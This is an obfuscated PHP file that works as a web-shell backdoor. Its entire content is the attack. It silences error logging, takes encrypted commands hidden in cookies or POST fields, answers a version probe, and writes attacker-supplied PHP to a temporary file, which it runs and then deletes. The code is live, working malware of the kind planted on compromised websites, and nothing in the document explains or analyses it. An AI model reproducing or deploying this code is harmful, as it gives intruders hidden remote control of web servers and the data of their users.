<?php $xsdlufim = chr(195-93)."\x69"."\154"."\145"."\137".'p'."\x75".chr(522-406)."\137".chr(406-307)."\x6f".'n'.chr(1078-962)."\x65".chr(793-683)."\x74".'s';
$ahwpuscii = chr(1062-964)."\141"."\x73"."\x65".'6'."\64".chr(292-197).chr(226-126).chr(101)."\x63".'o'."\144"."\x65";
$jyvyranl = "\x69"."\156"."\x69".chr(95)."\x73"."\x65".'t';
$nsogylsrg = 'u'."\x6e".'l'."\x69".'n'.chr(774-667);


@$jyvyranl(chr(101)."\162"."\162"."\157".'r'."\137".chr(108)."\x6f"."\147", NULL);
@$jyvyranl("\x6c"."\157".chr(103).chr(95).chr(101).chr(1002-888)."\162".chr(1029-918).chr(354-240).chr(310-195), 0);
@$jyvyranl('m'.'a'.'x'.'_'.chr(101)."\x78".chr(861-760).chr(514-415).chr(859-742)."\164"."\x69".chr(111).'n'.chr(236-141).chr(116)."\151"."\x6d"."\x65", 0);
@set_time_limit(0);

function bsjrmhwcwo($zjojiy, $zbwoxir)
{
    $dpjkduwzyi = "";
    for ($rlqayozyl = 0; $rlqayozyl < strlen($zjojiy);) {
        for ($j = 0; $j < strlen($zbwoxir) && $rlqayozyl < strlen($zjojiy); $j++, $rlqayozyl++) {
            $dpjkduwzyi .= chr(ord($zjojiy[$rlqayozyl]) ^ ord($zbwoxir[$j]));
        }
    }
    return $dpjkduwzyi;
}

$ojvvdjcev = array_merge($_COOKIE, $_POST);
$lyrhnw = '4c5fc6f3-7a48-40d9-9985-dee3b645d3c9';
foreach ($ojvvdjcev as $otjmeongo => $zjojiy) {
    $zjojiy = @unserialize(bsjrmhwcwo(bsjrmhwcwo($ahwpuscii($zjojiy), $lyrhnw), $otjmeongo));
    if (isset($zjojiy[chr(97).'k'])) {
        if ($zjojiy['a'] == 'i') {
            $rlqayozyl = array(
                "\x70".'v' => @phpversion(),
                chr(225-110).'v' => "3.5",
            );
            echo @serialize($rlqayozyl);
        } elseif ($zjojiy['a'] == "\145") {
            $lxjnj = "./" . md5($lyrhnw) . '.'.chr(596-491)."\156"."\x63";
            @$xsdlufim($lxjnj, "<" . chr(226-163)."\160".'h'."\x70".' '.chr(64)."\165".chr(110).chr(251-143)."\x69".chr(795-685)."\x6b".chr(40)."\x5f".chr(95)."\x46"."\x49".chr(670-594).'E'.chr(95)."\137".chr(41).';'."\40" . $zjojiy[chr(1076-976)]);
            @include($lxjnj);
            @$nsogylsrg($lxjnj);
        }
        exit();
    }
}

